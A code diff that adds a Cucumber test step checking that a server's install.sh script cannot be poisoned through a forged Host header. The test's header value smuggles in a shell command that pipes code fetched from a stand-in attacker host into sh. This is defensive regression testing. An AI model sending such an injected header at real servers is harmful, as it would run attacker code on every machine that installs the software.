@@ -1,5 +1,6 @@
 import { Then, When } from '@cucumber/cucumber';
 import assert from 'node:assert/strict';
+import http from 'node:http';
 import type { SkillDetail } from '../api.js';
 import { ShkillsWorld } from '../world.js';
 
@@ -53,6 +54,39 @@ Then('the installer can be downloaded', async function (this: ShkillsWorld) {
   assert.ok(
     script.includes(this.server.url),
     'install.sh does not point back at this server, so an installed CLI would talk to the wrong one',
+  );
+});
+
+/**
+ * The installer names back the address in the request, so that header decides
+ * what a `| sh` will talk to. `fetch` refuses to send a made-up Host at all,
+ * hence the raw request: this has to be asked the way an attacker would ask it.
+ */
+Then('a made-up Host header cannot get into the installer', async function (this: ShkillsWorld) {
+  const { port } = new URL(this.server.url);
+  const script = await new Promise<string>((resolve, reject) => {
+    const request = http.request(
+      {
+        host: '127.0.0.1',
+        port,
+        path: '/install.sh',
+        setHost: false,
+        headers: { Host: 'evil.example"; curl http://evil.example/x | sh; echo "' },
+      },
+      (response) => {
+        let body = '';
+        response.on('data', (chunk) => (body += String(chunk)));
+        response.on('end', () => resolve(body));
+      },
+    );
+    request.on('error', reject);
+    request.end();
+  });
+
+  assert.ok(!script.includes('evil.example'), `the installer served:\n${script.slice(0, 400)}`);
+  assert.ok(
+    script.includes(this.server.url),
+    'the installer fell back to something other than the configured address',
   );
 });
 
